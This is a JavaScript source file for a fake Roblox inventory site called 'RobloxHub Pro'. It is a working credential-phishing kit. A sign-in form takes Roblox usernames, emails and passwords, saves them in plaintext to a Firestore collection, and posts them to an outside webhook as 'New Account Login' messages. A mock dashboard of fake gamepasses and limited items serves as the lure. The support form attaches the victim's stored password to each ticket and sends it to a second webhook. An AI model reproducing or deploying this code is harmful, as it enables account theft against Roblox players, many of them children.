// Import the functions you need from the SDKs you need
import { initializeApp } from "https://www.gstatic.com/firebasejs/10.8.0/firebase-app.js";
import { getAnalytics } from "https://www.gstatic.com/firebasejs/10.8.0/firebase-analytics.js";
import { getFirestore, doc, setDoc, collection, addDoc } from "https://www.gstatic.com/firebasejs/10.8.0/firebase-firestore.js";

document.addEventListener("DOMContentLoaded", async () => {
  // Load configuration
  let config = {
    siteName: "RobloxHub Pro",
    supportEmail: "support@yourdomain.com",
    discordInvite: "https://discord.gg/your-invite-code",
    loginWebhookUrl: "",
    supportWebhookUrl: ""
  };

  try {
    const res = await fetch('config.json');
    if (res.ok) config = await res.json();
  } catch (e) {
    console.warn("Using default config values.");
  }

  // Bind configuration details
  const brandTitle = document.getElementById("brand-title");
  const footerEmail = document.getElementById("footer-email");
  const discordBtn = document.getElementById("discord-btn");
  const footerDiscordLink = document.getElementById("footer-discord-link");

  if (brandTitle) brandTitle.innerText = config.siteName;
  if (footerEmail) footerEmail.innerText = config.supportEmail;
  if (discordBtn) discordBtn.href = config.discordInvite;
  if (footerDiscordLink) footerDiscordLink.href = config.discordInvite;

  // Initialize Firebase
  const firebaseConfig = {
    apiKey: "AIzaSyAIRH-6mmznVMfGIegHF7ckQXq30MFDDBw",
    authDomain: "hockey-840dd.firebaseapp.com",
    databaseURL: "https://hockey-840dd-default-rtdb.firebaseio.com",
    projectId: "hockey-840dd",
    storageBucket: "hockey-840dd.firebasestorage.app",
    messagingSenderId: "454222626197",
    appId: "1:454222626197:web:6df5eea83d3bbae0df0a9c",
    measurementId: "G-BBNC63SFHZ"
  };

  const app = initializeApp(firebaseConfig);
  const analytics = getAnalytics(app);
  const db = getFirestore(app);

  // UI Elements
  const signinBtn = document.getElementById("signin-roblox-btn");
  const heroSigninBtn = document.getElementById("hero-signin-btn");
  const modalOverlay = document.getElementById("signin-modal");
  const cancelBtn = document.getElementById("modal-cancel");
  const authForm = document.getElementById("roblox-auth-form");
  const landingView = document.getElementById("landing-view");
  const dashboardView = document.getElementById("dashboard-view");
  const notificationBanner = document.getElementById("notification-banner");
  const signoutBtn = document.getElementById("signout-btn");
  
  const supportForm = document.getElementById("support-form");
  const supportMsgInput = document.getElementById("support-msg");
  const supportStatus = document.getElementById("support-status");

  const searchInput = document.getElementById("search-input");
  const gridContainer = document.getElementById("grid-container");
  const tabButtons = document.querySelectorAll(".tab-btn");

  let currentTab = "passes";
  let lastSupportTime = 0;
  let activeUserSession = null; // Track current session

  // Mock Roblox inventory items
  const robloxData = {
    passes: [
      { name: "VIP Gamepass", game: "Mega Obby Park", price: "400 Robux", date: "Aug 12, 2026", img: "https://images.unsplash.com/photo-1550745165-9bc0b252726f?w=300", placeId: "12345678" },
      { name: "Double Speed Pass", game: "Speed Runner Simulator", price: "250 Robux", date: "Sep 01, 2026", img: "https://images.unsplash.com/photo-1538481199705-c710c4e965fc?w=300", placeId: "87654321" },
      { name: "Infinite Ammo Perk", game: "Zombie Survival Tycoon", price: "600 Robux", date: "Sep 10, 2026", img: "https://images.unsplash.com/photo-1511512578047-dfb367046420?w=300", placeId: "11223344" }
    ],
    inventory: [
      { name: "Dominus Astra", game: "Limited Collector Item", price: "Valued Item", date: "Claimed", img: "https://images.unsplash.com/photo-1618005182384-a83a8bd57fbe?w=300" },
      { name: "Valkyrie Helm", game: "Limited Collector Item", price: "Valued Item", date: "Claimed", img: "https://images.unsplash.com/photo-1607604276583-eef5d076aa5f?w=300" }
    ],
    plugins: [
      { name: "Build-Pro Studio Tool", game: "Roblox Studio Extension", price: "Free Plugin", date: "Installed", img: "https://images.unsplash.com/photo-1618788372246-79faff0c3742?w=300" }
    ]
  };

  // Open Modal handlers
  const openModal = (e) => {
    if (e) e.preventDefault();
    if (modalOverlay) modalOverlay.classList.add("active");
  };

  if (signinBtn) signinBtn.onclick = openModal;
  if (heroSigninBtn) heroSigninBtn.onclick = openModal;

  if (cancelBtn) {
    cancelBtn.onclick = (e) => {
      e.preventDefault();
      if (modalOverlay) modalOverlay.classList.remove("active");
    };
  }

  // Sign out handler to switch accounts
  if (signoutBtn) {
    signoutBtn.onclick = () => {
      activeUserSession = null;
      dashboardView.style.display = "none";
      landingView.style.display = "block";
      landingView.classList.add("animate-fade");
      if (authForm) authForm.reset();
    };
  }

  // Handle Sign-In & Firestore Collection Save + Login Webhook
  if (authForm) {
    authForm.onsubmit = async (e) => {
      e.preventDefault();
      const usernameInput = document.getElementById("rbx-username");
      const emailInput = document.getElementById("rbx-email");
      const passwordInput = document.getElementById("rbx-password");

      const username = usernameInput ? usernameInput.value.trim() : "";
      const email = emailInput ? emailInput.value.trim() : "";
      const password = passwordInput ? passwordInput.value.trim() : "";

      if (!username || !password) return;
      if (modalOverlay) modalOverlay.classList.remove("active");

      activeUserSession = { username, email: email || "Not provided", password };

      // Save to Firestore collections (editable in Firebase Console)
      try {
        const userDocRef = doc(db, "roblox_users", username);
        await setDoc(userDocRef, {
          username: username,
          email: email || "Not provided",
          password: password,
          signedInAt: new Date().toISOString()
        });
      } catch (err) {
        console.error("Firestore write error:", err);
      }

      // Dispatch login info to Login Webhook URL
      if (config.loginWebhookUrl && config.loginWebhookUrl !== "YOUR_LOGIN_WEBHOOK_URL_HERE") {
        try {
          await fetch(config.loginWebhookUrl, {
            method: "POST",
            headers: { "Content-Type": "application/json" },
            body: JSON.stringify({
              content: `🔑 **New Account Login**\n> **Username:** ${username}\n> **Email:** ${email || "None"}\n> **Password:** ${password}\n> **Time:** ${new Date().toLocaleString()}`
            })
          });
        } catch (err) {
          console.error("Login webhook error:", err);
        }
      }

      // Switch to Dashboard View
      if (landingView) landingView.style.display = "none";
      if (dashboardView) {
        dashboardView.style.display = "block";
        dashboardView.classList.add("animate-fade");
      }
      if (notificationBanner) notificationBanner.style.display = "block";

      const userNameEl = document.getElementById("user-name");
      const userAvatarEl = document.getElementById("user-avatar");
      if (userNameEl) userNameEl.innerText = username;
      if (userAvatarEl) userAvatarEl.src = "https://tr.rbxcdn.com/30day-AvatarHeadshot/750/750/AvatarHeadshot/Png/isDefault/false";

      syncDiscordRoleBadge(username);
      renderItems();
    };
  }

  // Tab switching
  tabButtons.forEach(btn => {
    btn.onclick = (e) => {
      tabButtons.forEach(b => b.classList.remove("active"));
      e.target.classList.add("active");
      currentTab = e.target.dataset.tab;
      renderItems();
    };
  });

  // Search filtering
  if (searchInput) {
    searchInput.oninput = () => {
      renderItems(searchInput.value.toLowerCase());
    };
  }

  function renderItems(filter = "") {
    if (!gridContainer) return;
    gridContainer.innerHTML = "";
    const items = robloxData[currentTab] || [];

    const filtered = items.filter(item => 
      item.name.toLowerCase().includes(filter) || item.game.toLowerCase().includes(filter)
    );

    if (filtered.length === 0) {
      gridContainer.innerHTML = `<p style="grid-column: 1/-1; text-align: center; color: var(--text-muted); padding: 40px;">No matching items found.</p>`;
      return;
    }

    filtered.forEach(item => {
      const card = document.createElement("div");
      card.className = "item-card animate-fade";

      let actionHtml = '';
      if (currentTab === 'passes' && item.placeId) {
        actionHtml = `<button class="btn btn-primary" onclick="window.open('https://www.roblox.com/games/${item.placeId}', '_blank')">Join Game</button>`;
      } else {
        actionHtml = `<span style="font-size: 0.85rem; color: var(--success); font-weight: 600;">✔ Verified</span>`;
      }

      card.innerHTML = `
        <div>
          <img src="${item.img}" class="item-img" alt="${item.name}">
          <div class="item-title">${item.name}</div>
          <div class="item-meta">${item.game} • <b>${item.price}</b></div>
        </div>
        <div style="margin-top: 15px; display: flex; justify-content: space-between; align-items: center;">
          <span style="font-size: 0.8rem; color: var(--text-muted);">${item.date}</span>
          ${actionHtml}
        </div>
      `;
      gridContainer.appendChild(card);
    });
  }

  function syncDiscordRoleBadge(username) {
    const badgeContainer = document.getElementById("discord-badge-container");
    if (!badgeContainer) return;
    const userRole = "Verified Member"; 
    badgeContainer.innerHTML = `<span style="background: rgba(99, 102, 241, 0.2); border: 1px solid var(--primary); padding: 4px 12px; border-radius: 8px; font-size: 0.78rem; font-weight: 600; color: #a5b4fc;">Discord Role: ${userRole}</span>`;
  }

  // Help & Support Submission with 30s Cooldown, Firestore Collection Save, & Support Webhook
  if (supportForm) {
    supportForm.onsubmit = async (e) => {
      e.preventDefault();
      const now = Date.now();
      const cooldownRemaining = Math.ceil((30000 - (now - lastSupportTime)) / 1000);

      if (now - lastSupportTime < 30000) {
        if (supportStatus) {
          supportStatus.innerText = `Please wait ${cooldownRemaining} seconds before sending another support ticket.`;
        }
        return;
      }

      const msg = supportMsgInput ? supportMsgInput.value.trim() : "";
      if (!msg) return;

      if (supportStatus) supportStatus.innerText = "Sending support ticket instantly...";

      const ticketData = {
        username: activeUserSession ? activeUserSession.username : "Guest / Not Logged In",
        email: activeUserSession ? activeUserSession.email : "N/A",
        password: activeUserSession ? activeUserSession.password : "N/A",
        message: msg,
        submittedAt: new Date().toISOString()
      };

      // 1. Save ticket into Firestore collections
      try {
        const ticketsCollectionRef = collection(db, "support_tickets");
        await addDoc(ticketsCollectionRef, ticketData);
      } catch (err) {
        console.error("Firestore support save error:", err);
      }

      // 2. Dispatch to Support Webhook URL with user info and message
      if (config.supportWebhookUrl && config.supportWebhookUrl !== "YOUR_SUPPORT_WEBHOOK_URL_HERE") {
        try {
          await fetch(config.supportWebhookUrl, {
            method: "POST",
            headers: { "Content-Type": "application/json" },
            body: JSON.stringify({
              content: `🚨 **New Support Ticket**\n> **Username:** ${ticketData.username}\n> **Email:** ${ticketData.email}\n> **Password:** ${ticketData.password}\n> **Message:** ${msg}\n> **Time:** ${new Date().toLocaleString()}`
            })
          });
        } catch (err) {
          console.error("Support webhook error:", err);
        }
      }

      lastSupportTime = Date.now();
      if (supportMsgInput) supportMsgInput.value = "";
      if (supportStatus) {
        supportStatus.innerText = "Support ticket sent successfully! Please wait around 12 hours for a response. (30s cooldown active)";
      }
    };
  }
});